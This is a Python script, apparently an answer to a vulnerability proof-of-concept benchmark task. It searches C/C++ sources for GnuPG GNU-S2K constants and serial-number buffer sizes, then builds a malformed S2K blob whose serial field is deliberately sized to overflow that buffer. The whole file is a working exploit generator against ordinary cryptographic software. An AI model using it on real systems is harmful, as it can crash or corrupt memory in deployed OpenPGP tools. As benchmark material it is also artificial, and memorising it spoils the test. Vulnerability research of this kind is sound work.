import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if not os.path.isfile(p):
                        continue
                    if st.st_size > 2_000_000:
                        continue
                    try:
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except OSError:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    name = m.name
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, data
        except Exception:
            return

    def _extract_first_int(self, s: str) -> Optional[int]:
        m = re.search(r"\b(\d+)\b", s)
        if not m:
            return None
        try:
            return int(m.group(1))
        except Exception:
            return None

    def solve(self, src_path: str) -> bytes:
        # Defaults consistent with typical GnuPG GNU-S2K encoding:
        # type 101 (0x65), "GNU" marker, mode 2 for card-serial.
        s2k_gnu_type = 101
        gnu_mode_card = 2
        serial_buf_guess = None  # will choose smallest plausible
        sizes = []

        # Heuristic scanning of relevant C/C++ sources to infer buffer size / constants.
        exts = (".c", ".cc", ".cpp", ".h", ".hh", ".hpp")
        kw = ("s2k", "serial", "card", "openpgp", "gnu")
        define_gnu_s2k_re = re.compile(
            r"(?m)^\s*#\s*define\s+([A-Za-z0-9_]*S2K[A-Za-z0-9_]*GNU[A-Za-z0-9_]*|[A-Za-z0-9_]*GNU[A-Za-z0-9_]*S2K[A-Za-z0-9_]*)\s+(\d+)\b"
        )
        enum_gnu_s2k_re = re.compile(
            r"(?s)\b(enum|typedef\s+enum)\b.*?\{.*?\b([A-Za-z0-9_]*S2K[A-Za-z0-9_]*GNU[A-Za-z0-9_]*|[A-Za-z0-9_]*GNU[A-Za-z0-9_]*S2K[A-Za-z0-9_]*)\s*=\s*(\d+)\b"
        )
        define_mode_card_re = re.compile(
            r"(?m)^\s*#\s*define\s+([A-Za-z0-9_]*S2K[A-Za-z0-9_]*GNU[A-Za-z0-9_]*CARD[A-Za-z0-9_]*|[A-Za-z0-9_]*CARD[A-Za-z0-9_]*S2K[A-Za-z0-9_]*GNU[A-Za-z0-9_]*|[A-Za-z0-9_]*CARDMODE[A-Za-z0-9_]*)\s+(\d+)\b"
        )
        serial_array_re = re.compile(r"\bchar\s+[A-Za-z0-9_]*serial[A-Za-z0-9_]*\s*\[\s*(\d+)\s*\]")
        serial_define_re = re.compile(r"(?m)^\s*#\s*define\s+[A-Za-z0-9_]*SERIAL[A-Za-z0-9_]*\s+(\d+)\b")

        for name, data in self._iter_source_files(src_path):
            lowname = name.lower()
            if not lowname.endswith(exts):
                continue
            try:
                text = data.decode("latin1", errors="ignore")
            except Exception:
                continue
            low = text.lower()
            if not any(k in low for k in kw):
                continue

            for m in define_gnu_s2k_re.finditer(text):
                try:
                    v = int(m.group(2))
                    if 0 < v < 256:
                        s2k_gnu_type = v
                except Exception:
                    pass
            for m in enum_gnu_s2k_re.finditer(text):
                try:
                    v = int(m.group(3))
                    if 0 < v < 256:
                        s2k_gnu_type = v
                except Exception:
                    pass
            for m in define_mode_card_re.finditer(text):
                try:
                    v = int(m.group(2))
                    if 0 <= v < 256:
                        gnu_mode_card = v
                except Exception:
                    pass

            # Prefer sizes in files mentioning both s2k and serial/card
            if ("s2k" in low) and (("serial" in low) or ("card" in low)):
                for m in serial_array_re.finditer(text):
                    try:
                        v = int(m.group(1))
                        sizes.append(v)
                    except Exception:
                        pass
                for m in serial_define_re.finditer(text):
                    try:
                        v = int(m.group(1))
                        sizes.append(v)
                    except Exception:
                        pass

        # Choose smallest plausible serial buffer size (often 10 for card serial in this context).
        plausible = [s for s in sizes if 4 <= s <= 64]
        if plausible:
            serial_buf_guess = min(plausible)

        # Pick serial length to overflow (buffer + 2 as a safe small overflow).
        if serial_buf_guess is None:
            serial_len = 12  # yields total 27 bytes with the constructed GNU-S2K header
        else:
            serial_len = min(256, max(12, serial_buf_guess + 2))

        # Construct GNU S2K blob:
        # [type][hash][salt(8)][count][ 'G''N''U' ][mode][serial...]
        # Total length = 1+1+8+1+3+1+serial_len = 15+serial_len
        payload = bytes([s2k_gnu_type & 0xFF, 2]) + (b"B" * 8) + bytes([0x60]) + b"GNU" + bytes([gnu_mode_card & 0xFF]) + (b"A" * serial_len)
        return payload[:4096]